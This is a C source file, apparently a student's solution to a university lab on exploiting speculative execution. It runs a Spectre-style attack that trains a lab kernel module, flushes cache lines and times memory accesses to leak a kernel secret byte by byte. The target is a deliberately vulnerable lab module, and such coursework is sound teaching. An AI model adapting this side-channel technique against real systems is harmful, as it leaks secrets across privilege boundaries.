/*
 * Lab 2 for Securing Processor Architectures - Fall 2022
 * Exploiting Speculative Execution
 *
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "lab2.h"
#include "lab2ipc.h"

/*
 * call_kernel_part3
 * Performs the COMMAND_PART3 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
    lab2_command local_cmd;
    local_cmd.kind = COMMAND_PART3;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}
#define REPEAT(a) a; a; a; 

#define NUM_SAMPLES 100
#define DEBUG 0
uint32_t warmup=0;

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab 2 vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the server
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[LAB2_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        do {
            size_t times[LAB2_SHARED_MEMORY_NUM_PAGES] = {0};
            size_t min = 1000000000;
            //Flush all shared memory from cache
            for (size_t Samples = 0; Samples < NUM_SAMPLES; Samples++)
            {   
                REPEAT(call_kernel_part3(kernel_fd, shared_memory, current_offset % 2))    
                for (size_t i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++)
                {
                    clflush(shared_memory+(i*LAB2_PAGE_SIZE));
                }
                call_kernel_part3(kernel_fd, shared_memory, current_offset);
                for (size_t i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++)
                {
                    times[i] += time_access(shared_memory+(i*LAB2_PAGE_SIZE));   
                }
            }

            for (size_t i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++)
            {
                times[i] = times[i]/NUM_SAMPLES;
                #if DEBUG
                printf("%c: %ld ",i ,times[i]/NUM_SAMPLES);
                if (i % 20 ==0)
                {
                    printf("\n");
                }
                #endif
                if (times[i] < min)
                {
                    min = times[i];
                    leaked_byte = (char) i;
                }
                
            }
            #if DEBUG
            printf("\n\n");
            #endif
            

        }while(warmup++ < 15);

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Lab 2 Part 3] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
